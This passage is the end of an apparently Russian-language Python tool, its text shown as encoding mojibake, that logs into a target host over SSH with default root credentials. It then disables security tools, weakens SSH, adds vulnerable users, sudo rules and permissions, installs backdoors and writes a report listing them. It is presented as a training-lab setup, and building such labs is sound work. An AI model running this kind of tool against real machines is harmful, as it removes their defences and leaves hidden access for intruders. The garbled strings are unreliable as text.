            f.write("\nüòà –£–°–¢–ê–ù–û–í–õ–ï–ù–ù–´–ï BACKDOOR:\n")
            for backdoor in report['backdoors_installed']:
                f.write(f"  ‚Ä¢ {backdoor}\n")
            
            f.write("\nüìä –õ–û–ì –î–ï–ô–°–¢–í–ò–ô:\n")
            for log_entry in self.setup_log:
                status = "‚úÖ" if log_entry['success'] else "‚ùå"
                f.write(f"  {status} {log_entry['action']}\n")
                if log_entry['details']:
                    f.write(f"     {log_entry['details']}\n")
        
        self._log_action("–°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ –æ—Ç—á–µ—Ç–∞", True, txt_report)
    
    def run_full_setup(self):
        """–ó–∞–ø—É—Å–∫–∞–µ—Ç –ø–æ–ª–Ω—É—é –Ω–∞—Å—Ç—Ä–æ–π–∫—É —É—è–∑–≤–∏–º–æ–π —Å–∏—Å—Ç–µ–º—ã"""
        print("üîß ADVANCED KALI VULNERABLE SETUP")
        print("="*80)
        print("‚ö†Ô∏è –í–ù–ò–ú–ê–ù–ò–ï: –¢–æ–ª—å–∫–æ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π!")
        print("‚ö†Ô∏è –ù–µ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –≤ –ø—Ä–æ–¥–∞–∫—à–µ–Ω–µ!")
        print("="*80)
        
        if not self.connect_ssh():
            print("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ SSH")
            return False
        
        try:
            # –í—ã–ø–æ–ª–Ω—è–µ–º –≤—Å–µ —ç—Ç–∞–ø—ã –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
            self.setup_vulnerable_users()
            self.weaken_ssh_security()
            self.disable_security_tools()
            self.setup_vulnerable_web_services()
            self.create_backdoors()
            self.create_weak_permissions()
            self.setup_sudo_vulnerabilities()
            self.generate_setup_report()
            
            print("\n‚úÖ –ù–ê–°–¢–†–û–ô–ö–ê –£–Ø–ó–í–ò–ú–û–ô KALI LINUX –ó–ê–í–ï–†–®–ï–ù–ê!")
            print("üéØ –°–∏—Å—Ç–µ–º–∞ –≥–æ—Ç–æ–≤–∞ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –∞—Ç–∞–∫")
            print("üìö –ò–∑—É—á–∏—Ç–µ —Å–æ–∑–¥–∞–Ω–Ω—ã–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –∏ –º–µ—Ç–æ–¥—ã –∑–∞—â–∏—Ç—ã")
            
        except Exception as e:
            print(f"‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: {e}")
        finally:
            self.disconnect_ssh()

def main():
    """
    –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
    """
    parser = argparse.ArgumentParser(description='Advanced Kali Vulnerable Setup')
    parser.add_argument('target_ip', help='IP –∞–¥—Ä–µ—Å —Ü–µ–ª–µ–≤–æ–π Kali Linux')
    parser.add_argument('-u', '--username', default='root', help='–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è SSH (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é root)')
    parser.add_argument('-p', '--password', default='toor', help='–ü–∞—Ä–æ–ª—å SSH (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é toor)')
    parser.add_argument('--port', type=int, default=22, help='–ü–æ—Ä—Ç SSH (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é 22)')
    parser.add_argument('--users-only', action='store_true', help='–¢–æ–ª—å–∫–æ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π')
    parser.add_argument('--web-only', action='store_true', help='–¢–æ–ª—å–∫–æ –≤–µ–±-—Å–µ—Ä–≤–∏—Å—ã')
    parser.add_argument('--backdoors-only', action='store_true', help='–¢–æ–ª—å–∫–æ backdoor')
    
    args = parser.parse_args()
    
    setup = KaliVulnerableSetupAdvanced(args.target_ip, args.username, args.password, args.port)
    
    try:
        if args.users_only:
            setup.connect_ssh()
            setup.setup_vulnerable_users()
            setup.disconnect_ssh()
        elif args.web_only:
            setup.connect_ssh()
            setup.setup_vulnerable_web_services()
            setup.disconnect_ssh()
        elif args.backdoors_only:
            setup.connect_ssh()
            setup.create_backdoors()
            setup.disconnect_ssh()
        else:
            # –ü–æ–ª–Ω–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞
            setup.run_full_setup()
            
    except KeyboardInterrupt:
        print("\nüõë –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ø—Ä–µ—Ä–≤–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞: {e}")

if __name__ == "__main__":
    main()
